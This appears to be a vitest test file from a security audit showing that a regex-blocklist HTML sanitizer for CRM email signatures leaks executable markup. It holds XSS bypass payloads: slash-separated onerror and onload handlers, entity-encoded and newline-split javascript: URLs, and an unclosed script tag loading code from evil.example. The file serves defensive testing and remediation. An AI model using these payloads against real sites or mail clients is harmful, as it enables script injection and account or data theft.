// ─── ADVERSARIAL PROOF — audit 2026-09-02, finding A-08 ───────────────────
//
// `sanitizeSignatureHtml` is a regex BLOCKLIST: a list of bad tags, a list of
// `on*=` attribute shapes, and a `javascript:`-in-href replacement. Its output
// is fed to `dangerouslySetInnerHTML` in two places
// (app/crm/settings/SignatureEditor.tsx, app/crm/leads/[id]/ComposeEmailSheet.tsx)
// and shipped in outbound email.
//
// Blocklists of this shape are bypassable as a class, not as a bug. The two
// bypasses below are the standard ones and both survive verbatim:
//
//   1. The handler stripper anchors on `\s+on[a-z]+`. A `/` is a legal
//      attribute separator in HTML and is not `\s`, so `<img/onerror=…>`
//      passes through untouched.
//
//   2. The URL scheme filter matches the literal string `javascript:`. HTML
//      attribute values are entity-decoded by the parser AFTER the sanitizer
//      has run, so `j&#97;vascript:` passes through and executes.
//
// The point of this file is not the two payloads — it is that the function
// cannot be patched into correctness. Replace it with a parser-based
// allow-list (DOMPurify, or `sanitize-html` with an explicit tag/attribute
// allow-list) and delete the regexes.
//
// WHEN THAT LANDS: keep this file and invert both `toContain` assertions to
// `not.toContain`. It then pins the two bypasses closed.

import { describe, it, expect } from 'vitest';
import { sanitizeSignatureHtml } from './signature';

describe('A-08 — sanitizeSignatureHtml is a blocklist and leaks executable HTML', () => {
  it('does what it says on the obvious payloads', () => {
    expect(sanitizeSignatureHtml('<script>alert(1)</script>hi')).toBe('hi');
    expect(sanitizeSignatureHtml('<img src=x onerror="alert(1)">'))
      .not.toContain('onerror');
    expect(sanitizeSignatureHtml('<a href="javascript:alert(1)">x</a>'))
      .not.toContain('javascript:');
  });

  it('BYPASS 1 — a slash-separated event handler survives', () => {
    // `/` separates attributes in HTML but is not \s, so the three
    // `\s+on[a-z]+` patterns never match.
    const out = sanitizeSignatureHtml('<img/onerror=alert(document.domain) src=x>');
    expect(out).toContain('onerror');           // ← the handler is still there
    expect(out).toContain('alert(document.domain)');
  });

  it('BYPASS 1b — same trick on an SVG, no src needed', () => {
    const out = sanitizeSignatureHtml('<svg/onload=alert(1)>');
    expect(out).toContain('onload');
  });

  it('BYPASS 2 — an entity-encoded scheme survives the href filter', () => {
    // The sanitizer sees "j&#97;vascript:"; the browser's HTML parser
    // decodes the entity when it builds the attribute value, and the
    // resulting URL is javascript:alert(1).
    const out = sanitizeSignatureHtml('<a href="j&#97;vascript:alert(1)">click</a>');
    expect(out).toContain('j&#97;vascript:');   // ← not rewritten to '#'
  });

  it('BYPASS 3 — a newline inside the scheme survives too', () => {
    // Browsers strip control characters from URLs before scheme matching;
    // the regex does not.
    const out = sanitizeSignatureHtml('<a href="java\nscript:alert(1)">click</a>');
    expect(out).toContain('script:alert(1)');
  });

  it('BYPASS 4 — an unclosed bad tag is not removed', () => {
    // The paired pattern needs a closing tag and the self-closing pattern
    // needs a `>`. An unterminated `<script` leaves the raw text in place,
    // and browsers recover from it by opening the element anyway.
    const out = sanitizeSignatureHtml('<script src="//evil.example/x.js"');
    expect(out).toContain('<script');
  });
});
